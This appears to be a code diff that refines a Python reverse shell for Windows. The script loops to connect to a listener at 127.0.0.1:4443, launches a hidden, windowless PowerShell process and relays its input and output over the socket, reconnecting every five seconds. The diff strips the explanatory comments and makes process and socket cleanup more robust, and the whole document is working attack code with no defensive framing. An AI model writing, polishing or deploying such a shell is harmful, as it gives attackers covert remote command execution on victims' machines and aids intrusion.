@@ -3,12 +3,11 @@ from typing import BinaryIO, cast
 
 def connect():
     while True:
+        s = None
+        p = None
         try:
-            # Connect to listener
             s = socket.socket()
             s.connect(('127.0.0.1', 4443))
-            
-            # Start PS hidden with no window creation flags
             p = subprocess.Popen(
                 ['powershell.exe', '-WindowStyle', 'Hidden', '-NoProfile'],
                 stdin=subprocess.PIPE, 
@@ -17,44 +16,49 @@ def connect():
                 creationflags=0x08000000
             )
 
-            # Function to forward output from subprocess to socket
-            def pipe_output(pipe: BinaryIO | None):
+            def pipe_output(pipe: BinaryIO | None, sock: socket.socket):
                 if pipe is not None:
                     while True:
                         try:
                             data = pipe.read(1)
                             if not data:
                                 break
-                            s.sendall(data)
+                            sock.sendall(data)
                         except (OSError, socket.error):
                             break
             
-            # Use local variables and cast to satisfy static analysis
             stdout_pipe = cast(BinaryIO, p.stdout)
             stderr_pipe = cast(BinaryIO, p.stderr)
             stdin_pipe = cast(BinaryIO, p.stdin)
+            threading.Thread(target=pipe_output, args=(stdout_pipe, s), daemon=True).start()
+            threading.Thread(target=pipe_output, args=(stderr_pipe, s), daemon=True).start()
 
-            # Start threads for stdout and stderr
-            threading.Thread(target=pipe_output, args=(stdout_pipe,), daemon=True).start()
-            threading.Thread(target=pipe_output, args=(stderr_pipe,), daemon=True).start()
-
-            # Forward input from socket to subprocess
             if stdin_pipe is not None:
                 while True:
-                    try:
-                        data = s.recv(1024)
-                        if not data:
-                            break
-                        stdin_pipe.write(data)
-                        stdin_pipe.flush()
-                    except (OSError, socket.error):
+                    data = s.recv(1024)
+                    if not data:
                         break
+                    stdin_pipe.write(data)
+                    stdin_pipe.flush()
                 
-            s.close()
-            p.terminate()
         except Exception:
-            # Retry connection after delay
+            pass
+        finally:
+            if p:
+                try:
+                    p.terminate()
+                    p.wait(timeout=2)
+                except Exception:
+                    try: p.kill()
+                    except Exception: pass
+            if s:
+                try:
+                    s.close()
+                except Exception:
+                    pass
+            
             time.sleep(5)
+
 
 if __name__ == "__main__":
     connect()
